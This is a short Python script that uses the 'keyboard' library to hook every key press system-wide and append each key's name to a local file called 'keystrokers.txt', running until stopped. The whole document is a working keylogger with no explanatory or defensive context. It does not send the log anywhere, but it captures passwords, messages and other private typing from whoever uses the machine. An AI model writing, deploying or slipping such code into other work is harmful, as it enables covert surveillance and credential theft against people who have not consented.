import keyboard

file_path = 'keystrokers.txt'

with open(file_path, 'w') as f:
    f.truncate(0)

def write_to_file(event):
    with open(file_path, 'a') as f:
        f.write(event.name + '\n')
        
keyboard.on_press(write_to_file)

keyboard.wait()